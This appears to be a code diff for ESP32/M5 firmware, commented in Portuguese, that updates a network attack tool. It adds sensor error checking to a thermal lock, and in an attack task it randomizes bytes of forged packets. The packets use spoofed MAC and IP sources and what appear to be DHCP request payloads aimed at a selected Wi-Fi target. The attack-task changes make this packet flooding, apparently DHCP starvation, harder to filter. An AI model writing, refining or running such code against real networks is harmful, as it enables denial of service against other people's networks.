@@ -288,15 +288,27 @@ void task_display(void *pvParameters) {
                 M5.Display.printf("⚔️ ALVO: %s\n", alvos_encontrados[alvo_selecionado].ssid);
                 
                 float tsens_out = 0.0;
-                if (temp_sensor != NULL) temperature_sensor_get_celsius(temp_sensor, &tsens_out);
-                
-                if (tsens_out > 75.0 && !thermal_lock.load()) { 
-                    thermal_lock.store(true); tx_power_max.store(false); flag_update_config.store(true); 
-                } 
-                else if (tsens_out < 65.0 && thermal_lock.load()) { 
-                    thermal_lock.store(false); 
-                    tx_power_max.store(tx_power_max_user.load()); // CORREÇÃO 2.5: Respeito à vontade original
-                    flag_update_config.store(true); 
+                if (temp_sensor != NULL) {
+                    // 1. Captura o código de erro/sucesso da leitura do sensor I2C interno
+                    esp_err_t res = temperature_sensor_get_celsius(temp_sensor, &tsens_out);
+                    
+                    // 2. Só prossegue se a leitura foi um sucesso (ESP_OK) 
+                    // e se o valor é são (maior que 0ºC e menor que 100ºC)
+                    if (res == ESP_OK && tsens_out > 0.0 && tsens_out < 100.0) {
+                        
+                        if (tsens_out > 75.0 && !thermal_lock.load()) { 
+                            thermal_lock.store(true); 
+                            tx_power_max.store(false); 
+                            flag_update_config.store(true); 
+                        } 
+                        else if (tsens_out < 65.0 && thermal_lock.load()) { 
+                            thermal_lock.store(false); 
+                            tx_power_max.store(tx_power_max_user.load()); // Restaura a preferência do utilizador
+                            flag_update_config.store(true); 
+                        }
+                    }
+                    // Se o sensor falhar (res != ESP_OK) ou devolver lixo (ex: 125ºC), 
+                    // o IF é ignorado e o equipamento não fica bloqueado permanentemente.
                 }
                 
                 if (thermal_lock.load()) M5.Display.setTextColor(TFT_RED, TFT_BLACK);
@@ -458,7 +470,7 @@ void task_ataque(void *pvParameters) {
                     pkt->mac.mac_src[3] = fast_rand() & 0xFF; pkt->mac.mac_src[4] = fast_rand() & 0xFF; pkt->mac.mac_src[5] = fast_rand() & 0xFF;
 
                     pkt->ip.id = (uint16_t)fast_rand(); pkt->ip.frag_off = 0; 
-                    int subnet_idx = fast_rand() % 4;
+                    int subnet_idx = fast_rand() & 3;
                     pkt->ip.ip_src[0] = subnets[subnet_idx][0]; pkt->ip.ip_src[1] = subnets[subnet_idx][1]; 
                     pkt->ip.ip_src[2] = fast_rand() & 0xFF; pkt->ip.ip_src[3] = fast_rand() & 0xFF;
                     
@@ -515,6 +527,10 @@ void task_ataque(void *pvParameters) {
                         
                         memset(payload, 0, 248); 
                         payload[0] = 0x01; payload[1] = 0x01; payload[2] = 0x06; payload[3] = 0x00; 
+                        payload[4] = fast_rand() & 0xFF; 
+                        payload[5] = fast_rand() & 0xFF; 
+                        payload[6] = fast_rand() & 0xFF; 
+                        payload[7] = fast_rand() & 0xFF;
                         for(int m = 0; m < 6; m++) payload[28 + m] = fast_rand() & 0xFF; 
                         payload[236] = 0x63; payload[237] = 0x82; payload[238] = 0x53; payload[239] = 0x63;
                         
